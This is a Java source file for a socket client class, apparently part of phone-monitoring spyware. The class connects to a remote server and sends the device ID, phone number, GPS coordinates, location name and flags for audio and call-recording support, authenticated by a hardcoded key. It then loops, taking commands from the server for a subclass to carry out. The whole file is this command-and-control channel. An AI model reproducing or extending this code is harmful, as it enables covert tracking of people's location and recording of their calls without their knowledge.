package com.privacy.monitor.service.utilservice;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.net.Socket;
import java.util.HashMap;
import java.util.Map;
import com.google.gson.Gson;
import com.privacy.monitor.domain.DeviceInfo;


/**
 * 客户端socket用于随时接受发送的指令
 */
public abstract class ClientSocket extends Thread {
	
	private static final String DEVICE_ID = "device_id";
	private static final String PHONE_NUM = "phone_num";
	private static final String LON = "lon";
	private static final String LAT = "lat";
	private Socket m_socket;
	
	//是否支持录音
	private static final String SUP_REC = "support_rec";
	//是否支持GPS
	private static final String SUP_GPS = "support_gps";
	//是否支持通话录音
	private static final String SUP_CALL_REC = "support_call_rec";
	
	private static final String DEVICE_BRAND = "brand";
	private static final String DEVICE_SYSTEM = "system";
	private static final String SOCKET_REQ_KEY_VAL = "e271#af5=fe0ZacdB45379f234ecAe17";
	private static final String LOC_NAME = "loc_name";
	private static final String FONT_CODE = "UTF-8";
	
	public static String APP_REQ_KEY = "";
	private String loc_name;
	private String server;
	private int port;
	
	private DeviceInfo deviceInfo;

	public static final int DEVICE_SUPPORT = 1;
	public static final int DEVICE_NOT_SUPPORT = 0;
	
	public ClientSocket(DeviceInfo deviceInfo){
		this.deviceInfo = deviceInfo;
	}
	
	@Override
	public void run() {
		while(true){
			Socket socket = getSocket();
			if(socket !=null && !socket.isInputShutdown() && !socket.isClosed() && socket.isConnected()){
				try {
					socket.setKeepAlive(true);
					BufferedReader br = new BufferedReader(new InputStreamReader(socket.getInputStream(),FONT_CODE));
					String data = "";
					while((data=br.readLine()) != null){
						receiveData(data);
					}
				} catch (Exception e) {
					try {
						m_socket.close();
					} catch (Exception e2) {
						m_socket = null;
						System.out.println("Socket Read Data Fail");
					}
				}
			}
		}
	}
	
	private void receiveData(String mapString){
		Map<String,String> map = new Gson().fromJson(mapString, HashMap.class);
		String type = "";
		String data = null;
		if(map.containsKey("type")){
			type = map.get("type").toString();
		}
		if(map.containsKey("data")){
			data = map.get("data");
		}
		if(map.containsKey("key")){
			APP_REQ_KEY = map.get("key").toString();
		}
		if(!type.equals("")&& data !=null){
			receiveData(type,data);
		}
	}
	
	public abstract void receiveData(String type, String data);
	
	private void sendDeviceInfo(){
		Map<String,String> cMap= new HashMap<String, String>();
		cMap.put(DEVICE_ID, deviceInfo.getDeviceID());
		cMap.put(PHONE_NUM, deviceInfo.getPhoneNum());
		cMap.put(LON, deviceInfo.getLon() + "");
		cMap.put(LAT, deviceInfo.getLat() + "");
		cMap.put(SUP_REC, deviceInfo.getSupRec() + "");
		cMap.put(SUP_GPS, deviceInfo.getSupGPS() + "");
		cMap.put(SUP_CALL_REC, deviceInfo.getSupCallRec() + "");
		cMap.put(DEVICE_BRAND,deviceInfo.getBrand());
		cMap.put(DEVICE_SYSTEM,deviceInfo.getSystem());
		cMap.put(LOC_NAME, loc_name);
		cMap.put("key", SOCKET_REQ_KEY_VAL);
		String mapStr = new Gson().toJson(cMap);
		try {
			PrintWriter pw = new PrintWriter(new OutputStreamWriter(m_socket.getOutputStream(),FONT_CODE));
			pw.println(mapStr);
			pw.flush();

		} catch (Exception e) {
			System.out.println("Socket Send Device Info Failed");
		}
	}
	
	private Socket getSocket(){
		if(m_socket==null){
			createSocket();
		}else {
			if(!m_socket.isConnected()){
				createSocket();
			}
		}
		return m_socket;
	}
	
	private void createSocket(){
		try {
			m_socket = new Socket(server,port);
			sendDeviceInfo();
		} catch (Exception e) {
			System.out.println("Socket Connected Fail On " + server + ":" + port);
			if(m_socket!=null){
				try {
					m_socket.close();
				} catch (IOException e1) {
					e1.printStackTrace();
				}
				m_socket = null;
			}
		}
	}
}
